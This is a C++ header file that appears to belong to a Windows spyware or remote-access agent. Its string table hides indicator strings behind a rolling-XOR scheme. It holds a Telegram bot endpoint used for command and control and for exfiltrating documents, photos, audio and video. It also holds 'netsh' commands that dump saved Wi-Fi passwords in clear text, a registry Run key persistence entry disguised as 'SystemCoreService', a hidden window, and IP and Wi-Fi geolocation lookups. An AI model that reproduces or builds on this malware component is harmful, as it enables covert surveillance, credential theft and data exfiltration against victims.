#pragma once

#include <string>
#include <unordered_map>
#include <mutex>
#include <random>
#include <cstdint>

namespace nuub::domain {

// Runtime string encryption/decryption
// Uses a per-process random XOR key derived at init time
class StringTable {
    // Per-process random key (different each run, not predictable from binary)
    inline static uint8_t xor_key_ = 0;
    inline static std::mutex mutex_;
    inline static std::unordered_map<std::string, std::string> cache_;

    static uint8_t generate_key() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<int> dist(1, 255); // Never 0 (would be no-op)
        return static_cast<uint8_t>(dist(gen));
    }

    static std::string xor_decode(const std::string& encoded) {
        std::string result = encoded;
        for (size_t i = 0; i < result.size(); ++i) {
            // Rolling XOR: key changes per byte based on position + base key
            uint8_t byte_key = static_cast<uint8_t>(
                xor_key_ + ((i * 0x37) & 0xFF) + ((i >> 3) & 0x1F));
            result[i] ^= byte_key;
        }
        return result;
    }

    static std::string xor_encode(const std::string& plain) {
        return xor_decode(plain); // Rolling XOR is symmetric
    }

public:
    static void store(const std::string& key, const std::string& value) {
        std::lock_guard lock(mutex_);
        cache_[key] = xor_encode(value);
    }

    static std::string get(const std::string& key) {
        std::lock_guard lock(mutex_);
        auto it = cache_.find(key);
        if (it != cache_.end()) {
            return xor_decode(it->second);
        }
        return "";
    }

    static void init() {
        // Generate per-process random key
        xor_key_ = generate_key();

        // Registry paths
        store("reg_run", "Software\\Microsoft\\Windows\\CurrentVersion\\Run");

        // Network
        store("tg_api", "https://api.telegram.org/bot");
        store("tg_send_doc", "/sendDocument");
        store("tg_send_photo", "/sendPhoto");
        store("tg_send_video", "/sendVideo");
        store("tg_send_audio", "/sendAudio");
        store("tg_send_msg", "/sendMessage");
        store("tg_updates", "getUpdates");
        store("ipinfo", "https://ipinfo.io/json");
        store("ipapi", "http://ip-api.com/json/");
        store("maps_link", "https://www.google.com/maps/search/?api=1&query=");
        store("google_geo", "https://www.googleapis.com/geolocation/v1/geolocate?key=");
        store("apple_wps", "https://wifitracker.fun/api/geolocate");

        // System commands
        store("cmd_exe", "cmd.exe");
        store("tasklist", "tasklist /FO CSV 2>&1");
        store("taskkill", "taskkill /PID ");
        store("netsh_profiles", "netsh wlan show profiles 2>&1");
        store("netsh_visible", "netsh wlan show networks mode=Bssid 2>&1");
        store("netsh_key", "netsh wlan show profile name=\"");
        store("key_clear", "\" key=clear 2>&1");
        store("key_content", "Key Content");
        store("key_content_es", "Contenido de la clave");

        // Persistence
        store("ntdll", "ntdll.dll");
        store("rtl_get_version", "RtlGetVersion");
        store("agent_window", "AgentWindowClass");
        store("hidden_window", "Hidden");

        // Messages
        store("connected_msg", "Agente conectado y activo.");
        store("heartbeat_msg", "Heartbeat - still alive");
        store("no_activity", "No habia nueva actividad para reportar.");

        // File operations
        store("downloaded", "downloaded_file.exe");
        store("report_prefix", "reporte_");
        store("activity_log", "activity_log.csv");

        // Config keys
        store("cfg_token", "telegram_bot_token");
        store("cfg_admin", "admin_chat_id");
        store("cfg_admins", "admin_chat_ids");
        store("cfg_pc", "pc_identifier");
        store("cfg_password", "encryption_password");
        store("cfg_master_log", "master_log_filename");
        store("cfg_activity_log", "activity_log_filename");
        store("cfg_auto_start", "auto_start_entry_name");
        store("cfg_log", "log_filename");
        store("cfg_heartbeat", "heartbeat_interval_minutes");

        // Default names
        store("default_pc", "PC-Principal");
        store("default_entry", "SystemCoreService");
        store("default_master", "log_master.txt");
        store("default_log", "nuub.log");
    }
};

} // namespace nuub::domain
